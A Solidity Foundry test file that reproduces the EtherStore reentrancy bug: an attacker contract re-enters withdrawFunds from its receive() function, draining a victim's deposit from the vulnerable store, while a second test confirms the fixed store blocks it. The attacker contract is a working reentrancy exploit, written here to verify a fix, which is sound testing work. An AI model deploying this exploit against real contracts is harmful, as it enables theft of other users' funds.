// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";
import {EtherStoreFixed} from "../src/EtherStoreFixed.sol";

/*
 * EtherStore differential fixture test.
 *
 * Setup (both halves): a victim EOA deposits 1 ether, the attacker contract
 * deposits 1 ether, so the store holds 2 ether. The attacker then calls
 * withdrawFunds(1 ether). In its receive() it re-enters withdrawFunds(1 ether)
 * exactly once, via a low-level call whose failure is ignored (so the fixed
 * variant's reverting re-entry does not blow up the whole tx).
 *
 * NOTE on the 1-week lock: lastWithdrawTime starts at 0, so the withdrawal is
 * time-locked until block.timestamp >= 1 weeks. We vm.warp(2 weeks) to satisfy it.
 */

/// Attacker contract for the EtherStore reentrancy.
contract EtherStoreAttacker {
    address public store;
    uint256 private reentered;

    constructor(address _store) payable {
        store = _store;
    }

    function deposit() external {
        (bool ok, ) = store.call{value: 1 ether}(abi.encodeWithSignature("depositFunds()"));
        require(ok, "deposit failed");
    }

    function attack() external {
        (bool ok, ) = store.call(abi.encodeWithSignature("withdrawFunds(uint256)", uint256(1 ether)));
        require(ok, "attack failed");
    }

    receive() external payable {
        if (reentered == 0) {
            reentered = 1;
            // Re-enter once. In the vulnerable store this pulls a second 1 ether;
            // in the fixed store it reverts (balance already zeroed) and is ignored.
            (bool ok, ) = store.call(abi.encodeWithSignature("withdrawFunds(uint256)", uint256(1 ether)));
            ok;
        }
    }
}

contract EtherStoreFixtureTest is Test {
    address internal constant VICTIM = address(0xBEEF);

    function test_fixtureReproduces() public {
        EtherStore store = new EtherStore();
        EtherStoreAttacker attacker = new EtherStoreAttacker(address(store));
        vm.deal(address(attacker), 1 ether);

        // victim deposits 1 ether
        vm.deal(VICTIM, 1 ether);
        vm.startPrank(VICTIM);
        store.depositFunds{value: 1 ether}();
        vm.stopPrank();

        // attacker deposits 1 ether
        attacker.deposit();

        assertEq(address(store).balance, 2 ether, "store holds 2 ether");
        assertEq(store.balances(address(attacker)), 1 ether, "attacker credit is 1 ether");

        vm.warp(2 weeks); // satisfy the 1-week withdrawal lock

        attacker.attack();

        // Attacker pulled 2 ether for a 1 ether deposit (+1 ether profit) and the
        // store is fully drained -- the victim's ether is gone.
        assertEq(address(attacker).balance, 2 ether, "REPRODUCED: attacker drained 2 ether");
        assertEq(address(store).balance, 0, "REPRODUCED: store drained to zero");
        assertGt(address(attacker).balance, 1 ether, "REPRODUCED: profit over own deposit");
    }

    function test_fixtureDoesNotReproduce() public {
        EtherStoreFixed store = new EtherStoreFixed();
        EtherStoreAttacker attacker = new EtherStoreAttacker(address(store));
        vm.deal(address(attacker), 1 ether);

        vm.deal(VICTIM, 1 ether);
        vm.startPrank(VICTIM);
        store.depositFunds{value: 1 ether}();
        vm.stopPrank();

        attacker.deposit();
        vm.warp(2 weeks);

        attacker.attack();

        // The re-entrant withdrawal reverted (checks-effects-interactions) and was
        // ignored: the attacker only recovered its own deposit, the victim's ether
        // is retained by the store.
        assertEq(address(attacker).balance, 1 ether, "attacker only recovered own deposit");
        assertEq(address(store).balance, 1 ether, "victim funds retained");
        assertEq(store.balances(address(attacker)), 0, "attacker credit zeroed once");
    }
}
